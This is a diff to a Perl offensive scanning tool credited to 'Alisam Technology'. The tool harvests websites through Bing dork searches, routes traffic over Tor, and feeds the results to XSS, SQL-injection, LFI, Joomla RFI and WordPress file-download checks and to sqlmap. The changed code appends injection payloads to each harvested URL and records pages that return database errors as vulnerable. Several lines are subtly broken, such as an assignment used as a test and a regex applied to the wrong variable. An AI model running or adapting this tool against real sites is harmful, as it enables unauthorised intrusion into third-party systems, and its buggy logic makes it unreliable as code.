@@ -50,25 +50,25 @@ print color 'bold cyan';
 print "     ##     ##    ##     ######   ######  ##     ## ##    ##    ";
 print color 'red';
 print "`-'--^--`-'\n";
-print "     ______________( No monopoly for knowledge )_______________/-------------/\n";
+print "___________________( No monopoly for knowledge )_______________/-------------/\n";
 print color RESET;
 print "\n";
 
 if (!@ARGV) {
   print color 'bold yellow';
-  print "    [!] You are in the Simple Mode! To Use commands ./",basename($0)," <option>\n";
-  print "    [!] HELP:: perl ./",basename($0)," --help\n";
+  print "[!] You are in the Simple Mode! To Use commands ./",basename($0)," <option>\n";
+  print "[!] HELP:: perl ./",basename($0)," --help\n";
   print color RESET;
   print color 'bold';
-  print "    [ ] --------------------------------------------------------------\n";
+  print "[ ] ---------------------------------------------------------------------------\n";
   print color RESET;
   desclaimer();
 }else{
   print color 'bold yellow';
-  print "    [!] HELP:: perl ./",basename($0)," --help\n";
+  print "[!] HELP:: perl ./",basename($0)," --help\n";
   print color RESET;
   print color 'bold';
-  print "    [ ] --------------------------------------------------------------\n";
+  print "[ ] ---------------------------------------------------------------------------\n";
   print color RESET;
   desclaimer();
 }
@@ -124,7 +124,7 @@ use Getopt::Long ();
 my $proxy;
 my $help;
 my $dork;
-my $mpages;
+my $mlevel;
 my $mxss;
 my $Target;
 my $listname;
@@ -161,7 +161,7 @@ Getopt::Long::GetOptions(\my %OPT,
                         'tor' => \$proxy,
                         'help' => \$help,
                         'dork=s' => \$dork,
-                        'mp=s' => \$mpages,
+                        'level=s' => \$mlevel,
                         'xss' => \$mxss,
                         't=s' => \$Target,
                         'l=s' => \$listname,
@@ -204,7 +204,7 @@ if (@ARGV > 0){
             'help',
             'dork',
 			'tor',
-			'mp',
+			'level',
 			'xss',
 			't',
 			'l',
@@ -242,55 +242,55 @@ if (@ARGV > 0){
 			'select',
   );
   
-  if (!exists $com{help || tor || dork || mp || xss || t || l || xss || valid || exp || sqlmap || lfi || joomrfi || shell || wpadf || admin || shost || ports || start || end || tcp || udp || basic || all || sites || wp || joom || zip || upload || md5 || decode64 || encode64 || st || httpd || command || TARGET || isup || about || select}) {
+  if (!exists $com{help || tor || dork || level || xss || t || l || xss || valid || exp || sqlmap || lfi || joomrfi || shell || wpadf || admin || shost || ports || start || end || tcp || udp || basic || all || sites || wp || joom || zip || upload || md5 || decode64 || encode64 || st || httpd || command || TARGET || isup || about || select}) {
 	advise();
   }
 }
 
 ###################################################
 sub desclaimer {
-  print "    [ ] ---------------------------------------------------------- [ ]\n";
-  print "    [ ]    We will not be responsible or liable, directly or       [ ]\n";
-  print "    [ ]  indirectly in any way for any loss or damage of any kind  [ ]\n";
-  print "    [ ]          incurred as result of our program use !!          [ ]\n";
-  print "    [ ] ---------------------------------------------------------- [ ]\n";
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  print "[ ]          We will not be responsible or liable, directly or              [ ]\n";
+  print "[ ]       indirectly in any way for any loss or damage of any kind          [ ]\n";
+  print "[ ]                incurred as result of our program use !!                 [ ]\n";
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
   osinfo();
 }
 
 sub timer {
   my ($sec,$min,$hr) = localtime();
-  print "    [!] [";
+  print "[!] [";
   print "$hr:$min:$sec";
   print "] ";
 }
 sub osinfo {
   use Config;
   print color 'bold yellow';
-  print "    [+] GROUP:: ";
+  print "[+] GROUP:: ";
   print color RESET;
   print color 'red';
   print "Alisam Technology\n";
   print color RESET;
   print color 'bold yellow';
-  print "    [+] SCRIPT:: ";
+  print "[+] SCRIPT:: ";
   print color RESET;
   print color 'red';
   print "",basename($0)," \n";
   print color RESET;
   print color 'bold yellow';
-  print "    [+] PATH:: ";
+  print "[+] PATH:: ";
   print color RESET;
   print color 'red';
   print "$Bin/",basename($0)," \n";
   print color RESET;
   print color 'bold yellow';
-  print "    [+] PERL VERSION:: ";
+  print "[+] PERL VERSION:: ";
   print color RESET;
   print color 'red';
   print "$^V \n";
   print color RESET;
   print color 'bold yellow';
-  print "    [+] PLATFORM:: ";
+  print "[+] PLATFORM:: ";
   print color RESET;
   print color 'red';
   print "$Config{osname} ";
@@ -332,9 +332,10 @@ sub dorklist {
 }
 
 sub pro {
-  print "\n    [+]======================================";
-  print "\n    [!] ::: SUBPROCESS ... ";
-  print "\n    [+]======================================\n";
+  print "[+]======================================\n";
+  print "[!] ::: SUBPROCESS Please Wait... \n";
+  print "[+]======================================\n";
+  sleep (1);
 }
 
 sub mlistname {
@@ -371,7 +372,7 @@ sub server {
   if (($Target !~ m/.txt/i) && ($Target !~ m/.log/i)){
     if ($Target!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
       print color 'red';
-      print "    [!] The given IP is not valid!\n";
+      print "[!] The given IP is not valid!\n";
       print color RESET;
 	  exit();
     }
@@ -379,7 +380,7 @@ sub server {
 }
 sub forwait {
   print color 'yellow';
-  print "    [+] Please wait... \n";
+  print "[+] Please wait... \n";
   print color RESET;
   print color 'bold blue';
   progressbar();
@@ -392,7 +393,7 @@ sub progressbar {
   binmode STDOUT, ":utf8";
   timer();
   my $poop  = "::";
-  for (1..30) {
+  for (1..32) {
     select(undef, undef, undef, 0.25);
     print "$poop";
   }
@@ -402,7 +403,7 @@ sub progressbar {
 sub scandetail {
   if ((defined $Target) || (defined $mtarget)) {
     print color 'bold yellow';
-    print "    [+] TARGET:: ";
+    print "[+] TARGET:: ";
     print color RESET;
     print color 'red';
     if (defined $Target) {
@@ -414,17 +415,17 @@ sub scandetail {
     print color RESET;
   }  
 
-  if (defined $mpages) {
+  if (defined $mlevel) {
     print color 'bold yellow';
-    print "    [+] NUM PAGE RESULTS:: ";
+    print "[+] SCAN LEVEL:: ";
     print color RESET;
     print color 'red';
-    print "$mpages \n";
+    print "$mlevel \n";
     print color RESET;
   }
   if (defined $listname) {
     print color 'bold yellow';
-    print "    [+] LIST:: ";
+    print "[+] LIST:: ";
     print color RESET;
     print color 'red';
     print "$listname \n";
@@ -432,7 +433,7 @@ sub scandetail {
   }
   if ((defined $mxss) || (defined $mlfi)){
     print color 'bold yellow';
-    print "    [+] SCAN:: ";
+    print "[+] SCAN:: ";
     print color RESET;
     print color 'red';
     if (defined $mlfi) {
@@ -444,9 +445,9 @@ sub scandetail {
     print color RESET;
   }  
 
-  if ((defined $validation_text) || (defined $misup)) {
+  if ((defined $validation_text) || (defined $misup) || (defined $mhttpd) ) {
     print color 'bold yellow';
-    print "    [+] VALIDATION:: ";
+    print "[+] VALIDATION:: ";
     print color RESET;
     print color 'red';
     if (defined $validation_text) { 
@@ -455,20 +456,39 @@ sub scandetail {
     if (defined $misup) { 
       print "Code 200\n";
     }
+    if (defined $mhttpd) { 
+      print "Get Httpd Headers\n";
+    }
     print color RESET;
   }
   
-  if ((defined $sqlmap) || (defined $mjoomrfi) || (defined $mcommand) || (defined $mwpadf) || (defined $madmin) || (defined $msites) || (defined $msubdomain) || (defined $mports) || (defined $exploit)) {
+  if (defined $exploit) {
     print color 'bold yellow';
-    print "    [+] EXPLOITATION:: ";
+    print "[+] EXPLOIT:: ";
+    print color RESET;
+    print color 'red';
+    print "$exploit \n";
+    print color RESET;
+  }
+
+  
+  if ((defined $sqlmap) || (defined $mjoomrfi) || (defined $mjoomsites) || (defined $mwpsites) || (defined $mcommand) || (defined $mwpadf) || (defined $madmin) || (defined $msites) || (defined $msubdomain) || (defined $mports)) {
+  
+  if (defined $mwpsites) {
+    print color 'bold yellow';
+    print "[+] LIST:: ";
+    print color RESET;
+    print color 'red';
+    print "Server_sites_Scan.txt \n";
+    print color RESET;
+  }  
+    print color 'bold yellow';
+    print "[+] EXPLOITATION:: ";
     print color RESET;
     
     print color 'red';
     if (defined $sqlmap) {
       print "Sqlmap \n";
-    }
-    if (defined $exploit) {
-      print "$exploit \n";
     }
     if (defined $mjoomrfi) {
       print "Rfi Joomla \n";
@@ -567,7 +587,7 @@ sub listcheksubdomain {
 }
 sub negative {	
   print color 'red';
-  print "    [!] No Results Found!\n";
+  print "[!] No Results Found!\n";
   print color RESET;
   print color 'red';
   timer();
@@ -595,16 +615,18 @@ sub finxss {
     open my $file, "<", "XSS_Site_Scan.txt";
     $lc++ while <$file>;
     print color 'yellow';
-    print "    [!] $lc Unique Result(s) Found!\n";
+    print "[!] $lc Unique Result(s) Found!\n";
     print color RESET;
     close $file;
-    print color 'yellow';
-    print "    [+] Results saved in $Bin XSS_Site_Scan.txt! \n";
-    print color RESET;
-    print color 'red';
-	timer();
-    print "SCAN FINISHED!\n";
-    print color RESET;
+	if (!defined $sqlmap) {
+      print color 'yellow';
+      print "[+] Results saved in $Bin/XSS_Site_Scan.txt! \n";
+      print color RESET;
+      print color 'red';
+	  timer();
+      print "SCAN FINISHED!\n";
+      print color RESET;
+	}
   }else{
     negative();
   }	
@@ -631,11 +653,11 @@ sub finisup {
 	open my $file, "<", "Validated_Scan.txt";
     $lc++ while <$file>;
     print color 'yellow';
-    print "    [!] $lc Unique Result(s) Found!\n";
+    print "[!] $lc Unique Result(s) Found!\n";
     print color RESET;
     close $file;
     print color 'yellow';
-    print "    [+] Results saved in $Bin Validated_Scan.txt! \n";
+    print "[+] Results saved in $Bin/Validated_Scan.txt! \n";
     print color RESET;
     print color 'red';
 	timer();
@@ -667,11 +689,11 @@ if (-e $list){
     open my $file, "<", "Validated_Scan.txt";
     $lc++ while <$file>;
     print color 'yellow';
-    print "    [!] $lc Unique Result(s) Found!\n";
+    print "[!] $lc Unique Result(s) Found!\n";
     print color RESET;
     close $file;
     print color 'yellow';
-    print "    [+] Results saved in $Bin Validated_Scan.txt! \n";
+    print "[+] Results saved in $Bin/Validated_Scan.txt! \n";
     print color RESET;
     print color 'red';
 	timer();
@@ -704,11 +726,11 @@ sub finlfi {
     open my $file, "<", "LFI_Scan.txt";
     $lc++ while <$file>;
     print color 'yellow';
-    print "    [!] $lc Unique Result(s) Found!\n";
+    print "[!] $lc Unique Result(s) Found!\n";
     print color RESET;
     close $file;
     print color 'yellow';
-    print "    [+] Results saved in $Bin LFI_Scan.txt! \n";
+    print "[+] Results saved in $Bin/LFI_Scan.txt! \n";
     print color RESET;
     print color 'red';
 	timer();
@@ -740,11 +762,11 @@ sub finjomrfi {
     open my $file, "<", "Joom_RFI_Scan.txt";
     $lc++ while <$file>;
     print color 'yellow';
-    print "    [!] $lc Unique Result(s) Found!\n";
+    print "[!] $lc Unique Result(s) Found!\n";
     print color RESET;
     close $file;
     print color 'yellow';
-    print "    [+] Results saved in $Bin Joom_RFI_Scan.txt! \n";
+    print "[+] Results saved in $Bin/Joom_RFI_Scan.txt! \n";
     print color RESET;
     print color 'red';
 	timer();
@@ -776,11 +798,11 @@ sub finwpadf {
     open my $file, "<", "WP_ADF_Scan.txt";
     $lc++ while <$file>;
     print color 'yellow';
-    print "    [!] $lc Unique Result(s) Found!\n";
+    print "[!] $lc Unique Result(s) Found!\n";
     print color RESET;
     close $file;
     print color 'yellow';
-    print "    [+] Results saved in $Bin WP_ADF_Scan.txt! \n";
+    print "[+] Results saved in $Bin/WP_ADF_Scan.txt! \n";
     print color RESET;
     print color 'red';
 	timer();
@@ -813,11 +835,11 @@ sub finadmin {
     open my $file, "<", "Admin_page.txt";
     $lc++ while <$file>;
     print color 'yellow';
-    print "    [!] $lc Unique Result(s) Found!\n";
+    print "[!] $lc Unique Result(s) Found!\n";
     print color RESET;
     close $file;
     print color 'yellow';
-    print "    [+] Results saved in $Bin Admin_page.txt! \n";
+    print "[+] Results saved in $Bin/Admin_page.txt! \n";
     print color RESET;
     print color 'red';
 	timer();
@@ -849,11 +871,11 @@ sub finadomain {
     open my $file, "<", "Subdomains_Scan.txt";
     $lc++ while <$file>;
     print color 'yellow';
-    print "    [!] $lc Unique Result(s) Found!\n";
+    print "[!] $lc Unique Result(s) Found!\n";
     print color RESET;
     close $file;
     print color 'yellow';
-    print "    [+] Results saved in $Bin Subdomains_Scan.txt! \n";
+    print "[+] Results saved in $Bin/Subdomains_Scan.txt! \n";
     print color RESET;
     print color 'red';
 	timer();
@@ -867,7 +889,7 @@ sub finadomain {
 sub targetorlist {
   if ($code =~ /200/) {
     print color 'green';
-    print "    [+] $site2\n";
+    print "[+] $site2\n";
     print color RESET;
 
     open (TEXT, '>>Validated_Scan.txt');
@@ -880,20 +902,20 @@ sub mlisup {
   listchekisup();
   mlistname();
   mexploit();
-  countargets();
+  infocountargets();
   forwait();
   open (TEXT, $listname);
   while (my $Target = <TEXT>) { 
     chomp $Target;
     if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-    print "    [+] Checking $Target\n";
+    print "[+] Checking $Target\n";
     my $URL = $Target.$exploit;
     $URL =~ s/ //g;
     $useragent = LWP::UserAgent->new;
     $resp = $useragent->head($URL);
     if (head($URL)) {
       print color 'green';
-      print "    [+] $URL\n";
+      print "[+] $URL\n";
       print color RESET;
 
 	  open (INFO, '>>Validated_Scan.txt');
@@ -915,7 +937,7 @@ sub mtisup {
   $resp = $useragent->head($URL);
   if (head($URL)) {
     print color 'green';
-    print "    [+] $URL\n";
+    print "[+] $URL\n";
     print color RESET;
 
     open (INFO, '>>Validated_Scan.txt');
@@ -924,18 +946,39 @@ sub mtisup {
   }	
   finisup();
 }
-		
+
+sub siteinfo {
+  my $URL = $URL;
+  $request = HTTP::Request->new('GET', $URL);
+  $response = $ua->request($request);
+  if($response = RC_OK){
+    print "HTTP/1.1 200 OK  ";
+    use Socket;
+    my $URL=$site;	 
+    $URL =~ s/\/.*//s;
+    $ip = gethostbyname($URL);
+    if ($ip) {
+      printf "%s", "IP: ".inet_ntoa($ip);
+      undef $ip;
+      print "\n";
+	}else{
+      print "\n";
+    }
+  }  
+}
+	
+
+
 sub mlvalidation {
   listchekvalidation();
   mlistname();
   mexploit();
   countargets();
-  forwait();
   open (TEXT, $listname);
   while (my $Target = <TEXT>) { 
     chomp $Target;
     if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-    print "    [+] Checking $Target\n";
+    print "[+] Checking $Target\n";
     my $URL = $Target.$exploit;
     $URL =~ s/ //g;
 			
@@ -944,7 +987,7 @@ sub mlvalidation {
     my $html = $response->content;
     if($html =~ m/$validation_text/i){
       print color 'green';
-      print "    [+] $URL\n";
+      print "[+] $URL\n";
       print color RESET;
 
 	  open (INFO, '>>Validated_Scan.txt');
@@ -967,7 +1010,7 @@ sub mtvalidation {
   my $html = $response->content;
   if($html =~ m/$validation_text/i){
     print color 'green';
-    print "    [+] $URL\n";
+    print "[+] $URL\n";
     print color RESET;
 
     open (INFO, '>>Validated_Scan.txt');
@@ -983,10 +1026,44 @@ sub countargets {
   open my $file, "<", $listname;
   $lc++ while <$file>;
   print color 'bold yellow';
-  print "    [!] $lc Result(s) Found in the List!\n";
+  print "[!] TOTAL TARGETS IN LIST: ";
+  print color RESET;
+  print color 'red';
+  print "$lc Result(s) Found in the List!\n";
+  print color RESET;
+  close $file;
+  forwait();
+}
+
+sub infocounservertargets {
+  my $lc = 0;
+  my $file = "Server_sites_Scan.txt";
+  open my $file, "<", "Server_sites_Scan.txt";
+  $lc++ while <$file>;
+  print color 'bold yellow';
+  print "[!] TOTAL TARGETS IN LIST: ";
+  print color RESET;
+  print color 'red';
+  print "$lc Result(s) Found in the List!\n";
+  print color RESET;
+  close $file;
+  forwait();
+}
+
+sub infoinfocountargets {
+  my $lc = 0;
+  my $file = $listname;
+  open my $file, "<", $listname;
+  $lc++ while <$file>;
+  print color 'bold yellow';
+  print "[!] TOTAL TARGETS IN LIST: ";
+  print color RESET;
+  print color 'red';
+  print "$lc Result(s) Found in the List!\n";
   print color RESET;
   close $file;
 }
+
 
 sub testconection {
   print color 'yellow';
@@ -995,13 +1072,13 @@ sub testconection {
   $response = $ua->request($request);
   if ( !$response->is_success ) {
     print color 'red';
-    print "    [!] Upss.. Your Internet connection seems not active!\n";
-    print "    [!] Check Your Connection OR Proxy Setting!\n";
+    print "[!] Upss.. Your Internet connection seems not active!\n";
+    print "[!] Check Your Connection OR Proxy Setting!\n";
     print color 'RESET';
 	exit();
   }else{
     print color 'bold yellow';
-    print "    [+] PROXY:: ";
+    print "[+] PROXY:: ";
     print color RESET;
     if ((defined $proxy) || (defined $sqlmaptor)) {
       print color 'red';
@@ -1017,7 +1094,7 @@ sub testconection {
 
 sub submsearch {
   dorklist();
-  $mpages = $mpages;
+  $mlevel = $mlevel;
   msearch();
 }
 
@@ -1032,19 +1109,19 @@ sub msearch {
   print color 'bold yellow';
   scandetail();
   print color 'bold yellow';
-  print "    [+] RANDOM SEARCH:: ";
+  print "[+] RANDOM SEARCH:: ";
   print color RESET;
   print color 'red';
-  print "BING [". $myrand . "]\n";
+  print "BING [bing.". $myrand . "]\n";
   print color RESET;
   print color 'bold yellow';
-  print "    [+] DORK:: ";
+  print "[+] DORK:: ";
   print color RESET;
   print color 'red';
   print "$dork \n";
   print color RESET;
   print color 'bold';
-  print "    [ ] --------------------------------------------------------------\n";
+  print "[ ] ---------------------------------------------------------------------------\n";
   
   print color RESET;
   forwait();
@@ -1052,16 +1129,17 @@ sub msearch {
   open (FILE, "dorks.txt");
   while (my $dork = <FILE>) {
     print color 'bold';
-    print "    [+] DORK:: $dork \n";
+    print "[+] DORK:: $dork \n";
     print color RESET;
 	sleep(1);
-
+	
+	my $mlevel = $mlevel;
     $s_results = $dork;
     my @scanlist=&scan($s_results);
     sub scan(){
       my @search;
-      for($npages=1;$npages<=$mpages;$npages+=1){
-        my $google=("http://www.bing.com/search?q=".$s_results."&first=".$npages."&cc=".$myrand);
+      for($npages=0;$npages<=$mlevel;$npages+=10){
+        my $google=("http://www.bing.com/search?q=".$s_results."&first=".$npages."&FORM=PERE&cc=".$myrand);
         my $search=$ua->get("$google");
         $search->as_string;
         my $Res=$search->content;
@@ -1069,13 +1147,46 @@ sub msearch {
           if($1 !~ /msn|live|microsoft|WindowsLiveTranslator|youtube|google|cache|74.125.153.132|inurl:|q=|404|403|Time|out|Network|Failed/){
              my $site=$1;
             $site=~s/&(.*)/\ /g;
-			if ((defined $exploit) && ((defined $misup) || (defined $validation_text))) {
-			  $site =~ s/\/.*//s;
-			}
-	        print color 'green';
-            print "    [+] http://$site\n";
-	        print color RESET;
-
+			#if ((defined $exploit) && ((defined $misup) || (defined $validation_text))) {
+			  #$site =~ s/\/.*//s;
+			#}
+			if (!defined $mxss){
+			  print color 'bold yellow';
+			  print "[!] TARGET: ";
+	          print color RESET;
+	          print color 'green';
+              print "[+] http://$site \n";
+	          print color RESET;
+		   
+              my $URL = $site;
+              $request = HTTP::Request->new('GET', $URL);
+              $response = $ua->request($request);
+			  print color 'bold yellow';
+			  print "[!] INFO:   ";
+	          print color RESET;
+              if($response = RC_OK){
+                print "HTTP/1.1 200 OK  ";
+                use Socket;
+                my $URL=$site;	 
+                $URL =~ s/\/.*//s;
+                $ip = gethostbyname($URL);
+                if ($ip) {
+                  printf "%s", "IP: ".inet_ntoa($ip);
+                  undef $ip;
+                  print "\n";
+	            }else{
+                  print "\n";
+                }
+              }  
+	          if (defined $mhttpd) {
+                $Target=$site;	 
+                $Target =~ s/\/.*//s;
+		        mhttpd();
+              }
+			  
+		  	  print "[ ]............................................................................ \n";
+			  
+			}  
             open (TEXT, '>>Search_Scan.txt');
             print TEXT "http://$site\n";
             close (TEXT);
@@ -1119,20 +1230,21 @@ sub msearch {
     open my $file, "<", "Search_Scan.txt";
     $lc++ while <$file>;
 	print color 'yellow';
-	print "    [!] $lc Unique Result(s) Found!\n";
-	print color RESET;
-	close $file;
+	if (!defined $mxss) {
+	  print "[!] $lc Unique Result(s) Found!\n";
+	  print color RESET;
+	  close $file;
 	  
-    print color 'yellow';
-    print "    [!] Results saved in $Bin Search_Scan.txt\n";
-    print color RESET;
+      print color 'yellow';
+      print "[!] Results saved in $Bin/Search_Scan.txt\n";
+      print color RESET;
+	} 
   }else{
     print color 'yellow';
-    print "    [+] No Results Found!\n";
+    print "[+] No Results Found!\n";
     print color RESET;
   }
   if ((defined $mxss) || (defined $mlfi) || (defined $command) || (defined $misup) || (defined $validation_text) || (defined $sqlmap) || (defined $sqlmaptor)) {
-    pro();
   }else{
     print color 'red';
     timer();
@@ -1145,31 +1257,63 @@ sub msearch {
 ## bgn mLexplVaXss
 sub mLexplVaXss {
   listchekxss();
+  XSS();
   mlistname();
   mexploit();
-   mvalidation_text();
-  ##################		
+  #############		
+  #scandetail();
   countargets();
-  scandetail();
-  forwait();
+  open (TEXT, $listname);
   while (my $Target = <TEXT>) { 
-    chomp $Target;
+	chomp $Target;
 	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-      print "    [+] Checking $Target\n";
+	
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+    print "$Target \n";
+	
+    my $URL1 = $Target;
+    $request = HTTP::Request->new('GET', $URL1);
+    $response = $ua->request($request);
+    print color 'bold yellow';
+	print "[!] INFO:   ";
+    print color RESET;
+    if($response = RC_OK){
+      print "HTTP/1.1 200 OK  ";
+      print "\n";
+    }
+	
+	foreach $XSS(@XSS){
 	  my $URL = $Target.$exploit;
-	  $URL =~ s/ //g;			  
+	  $URL =~ s/ //g;
       $request = HTTP::Request->new('GET', $URL);
       $response = $ua->request($request);
       my $html = $response->content;
-	  if($html =~ m/$validation_text/i){
-	  print color 'green';
-      print "    [+] $URL\n";
+	  print color 'bold yellow';
+	  print "[!] EXPL:   ";
 	  print color RESET;
-				
-	  open (INFO, '>>XSS_Site_Scan.txt');
-      print INFO "$URL\n";
-	  close (INFO);
-	}	         
+      print "$URL \n";
+		
+	  print color 'bold yellow';
+	  print "[!] VULN:   ";
+	  print color RESET;
+
+	  if($html =~ m/$validation_text/i){
+	    print color 'green';
+        print "$URL\n";
+	    print color RESET;
+
+	    open (INFO, '>>XSS_Site_Scan.txt');
+        print INFO "$URL\n";
+	    close (INFO);
+	  }else{
+	    print color 'red';
+        print "No \n";
+	    print color RESET;
+	  }
+	}
+	print "[ ]............................................................................ \n";
   }
   finxss();
   ## end mLexplVaXss
@@ -1184,27 +1328,57 @@ sub mLexplXss {
   mexploit();
   #############		
   countargets();
-  scandetail();
-  forwait();
   open (TEXT, $listname);
   while (my $Target = <TEXT>) { 
 	chomp $Target;
 	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-    print "    [+] Checking $Target\n";
-	my $URL = $Target.$exploit;
-	$URL =~ s/ //g;
-    $request = HTTP::Request->new('GET', $URL);
+	
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+    print "$Target \n";
+	
+    my $URL1 = $Target;
+    $request = HTTP::Request->new('GET', $URL1);
     $response = $ua->request($request);
-    my $html = $response->content;
-	if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
-	  print color 'green';
-      print "    [+] $URL\n";
+    print color 'bold yellow';
+	print "[!] INFO:   ";
+    print color RESET;
+    if($response = RC_OK){
+      print "HTTP/1.1 200 OK  ";
+      print "\n";
+    }  
+
+	foreach $XSS(@XSS){
+	  my $URL = $Target.$exploit;
+	  $URL =~ s/ //g;
+      $request = HTTP::Request->new('GET', $URL);
+      $response = $ua->request($request);
+      my $html = $response->content;
+	  print color 'bold yellow';
+	  print "[!] EXPL:   ";
+	  print color RESET;
+      print "$URL \n";
+		
+	  print color 'bold yellow';
+	  print "[!] VULN:   ";
 	  print color RESET;
 
-	  open (INFO, '>>XSS_Site_Scan.txt');
-      print INFO "$URL\n";
-	  close (INFO);
-	}	
+	  if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
+	    print color 'green';
+        print "$URL\n";
+	    print color RESET;
+
+	    open (INFO, '>>XSS_Site_Scan.txt');
+        print INFO "$URL\n";
+	    close (INFO);
+	  }else{
+	    print color 'red';
+        print "No \n";
+	    print color RESET;
+	  }
+	}
+	print "[ ]............................................................................ \n";
   }
   finxss();
 }
@@ -1216,29 +1390,58 @@ sub mLXss  {
   XSS();
   mlistname();
   countargets();
-  scandetail();
-  forwait();
   open (TEXT, $listname);
   while (my $Target = <TEXT>) {
 	chomp $Target;
-	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
-    print "    [+] Checking $Target\n";
+	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+    print "$Target \n";
+	
+    my $Target = $Target;
+	if($Target !~ /http:\/\//) { $Target = "$Target"; };
+    $request = HTTP::Request->new('GET', $Target);
+    $response = $ua->request($request);
+    print color 'bold yellow';
+	print "[!] INFO:   ";
+    print color RESET;
+    if($response = RC_OK){
+      print "HTTP/1.1 200 OK  ";
+      print "\n";
+    }  
+
 
 	foreach $XSS(@XSS){
+	
       my $URL = $Target.$XSS;
       $request = HTTP::Request->new('GET', $URL);
       $response = $ua->request($request);
       my $html = $response->content;
+	  
+	  print color 'bold yellow';
+	  print "[!] EXPL:   ";
+	  print color RESET;
+      print "$URL \n";
+		
+	  print color 'bold yellow';
+	  print "[!] VULN:   ";
+	  print color RESET;
+
 	  if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
 	    print color 'green';
-        print "    [+] $URL\n";
+        print "$URL\n";
 	    print color RESET;
-				
 		open (INFO, '>>XSS_Site_Scan.txt');
         print INFO "$URL\n";
 		close (INFO);
-	  } 
+	  }else{
+	    print color 'red';
+        print "No \n";
+	    print color RESET;
+	  }
     }
+	print "[ ]............................................................................ \n";
   }
   finxss();
 }
@@ -1250,22 +1453,53 @@ sub mtexplVaXss {
   Target();
   mexploit();
   mvalidation_text();
-  scandetail();
-  forwait();
-  my $URL = $Target.$exploit;
-  $URL =~ s/ //g;
-  $request = HTTP::Request->new('GET', $URL);
+  #scandetail();
+  
+  print color 'bold yellow';
+  print "[!] TARGET: ";
+  print color RESET;
+  print "$Target \n";
+  
+  my $URL1 = $Target;
+  $request = HTTP::Request->new('GET', $URL1);
   $response = $ua->request($request);
-  my $html = $response->content;
-  if($html =~ m/$validation_text/i){
-	print color 'green';
-    print "    [+] $URL\n";
+  print color 'bold yellow';
+  print "[!] INFO:   ";
+  print color RESET;
+  if($response = RC_OK){
+    print "HTTP/1.1 200 OK  ";
+    print "\n";
+  }  
+  
+    my $URL = $Target.$exploit;
+    $URL =~ s/ //g;
+    $request = HTTP::Request->new('GET', $URL);
+    $response = $ua->request($request);
+    my $html = $response->content;
+	
+	print color 'bold yellow';
+	print "[!] EXPL:   ";
 	print color RESET;
+    print "$URL \n";
+		
+	print color 'bold yellow';
+	print "[!] VULN:   ";
+	print color RESET;
+	
+    if($html =~ m/$validation_text/i){
+	  print color 'green';
+      print "$URL\n";
+	  print color RESET;
 			
-	open (INFO, '>>XSS_Site_Scan.txt');
-    print INFO "$URL\n";
-	close (INFO);
-  }
+	  open (INFO, '>>XSS_Site_Scan.txt');
+      print INFO "$URL\n";
+	  close (INFO);
+	}else{
+	  print color 'red';
+      print "No \n";
+	  print color RESET;
+	}
+  print "[ ]............................................................................ \n";
   finxss();
 }
 
@@ -1276,8 +1510,24 @@ sub mtexplXss {
   XSS();
   Target();
   mexploit();
-  scandetail();
-  forwait();
+  #scandetail();
+  
+  print color 'bold yellow';
+  print "[!] TARGET: ";
+  print color RESET;
+  print "$Target \n";
+  
+  my $URL1 = $Target;
+  $request = HTTP::Request->new('GET', $URL1);
+  $response = $ua->request($request);
+  print color 'bold yellow';
+  print "[!] INFO:   ";
+  print color RESET;
+  if($response = RC_OK){
+    print "HTTP/1.1 200 OK  ";
+    print "\n";
+  }  
+  
   my $URL = $Target.$exploit;
   $URL =~ s/ //g;
   $request = HTTP::Request->new('GET', $URL);
@@ -1285,13 +1535,14 @@ sub mtexplXss {
   my $html = $response->content;
   if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
 	print color 'green';
-    print "    [+] $URL\n";
+    print "[+] $URL\n";
 	print color RESET;
 			
 	open (INFO, '>>XSS_Site_Scan.txt');
     print INFO "$URL\n";
 	close (INFO);
   }
+  print "[ ]............................................................................ \n";
   finxss();
 }
 
@@ -1301,68 +1552,100 @@ sub mtXss{
   listchekxss();
   XSS();
   Target();
-  scandetail();
-  forwait();
+  #scandetail();
+  
+  print color 'bold yellow';
+  print "[!] TARGET: ";
+  print color RESET;
+  print "$Target \n";
+  
+  my $URL1 = $Target;
+  $request = HTTP::Request->new('GET', $URL1);
+  $response = $ua->request($request);
+  print color 'bold yellow';
+  print "[!] INFO:   ";
+  print color RESET;
+  if($response = RC_OK){
+    print "HTTP/1.1 200 OK  ";
+    print "\n";
+  }  
+
   foreach $XSS(@XSS){
     my $URL = $Target.$XSS;
     $request = HTTP::Request->new('GET', $URL);
     $response = $ua->request($request);
     my $html = $response->content;
+	
+	  print color 'bold yellow';
+	  print "[!] EXPL:   ";
+	  print color RESET;
+      print "$URL \n";
+		
+	  print color 'bold yellow';
+	  print "[!] VULN:   ";
+	  print color RESET;
+	
     if($html =~ m/MySQL/i || m/error/i || m/syntax/i){
 	  print color 'green';
-      print "    [+] $URL\n";
+      print "$URL\n";
 	  print color RESET;
 			
 	  open (INFO, '>>XSS_Site_Scan.txt');
       print INFO "$URL\n";
       close (INFO);
+	}else{
+	  print color 'red';
+      print "No \n";
+	  print color RESET;
     }
   }
+  print "[ ]............................................................................ \n";
   finxss();
 }
 
 ###################################################################		
 sub sqlmaptor {
-  scandetail();
+  #scandetail();
+  sleep(1);
   open (INFO, 'XSS_Site_Scan.txt');
   while (my $Target = <INFO>) {
 	chomp $Target;
 	$Target =~ s/\%.*//s;
     print color 'yellow';
-    print "    [+] Checking databases...";
+    print "[+] Checking databases...";
     print color RESET;
 		
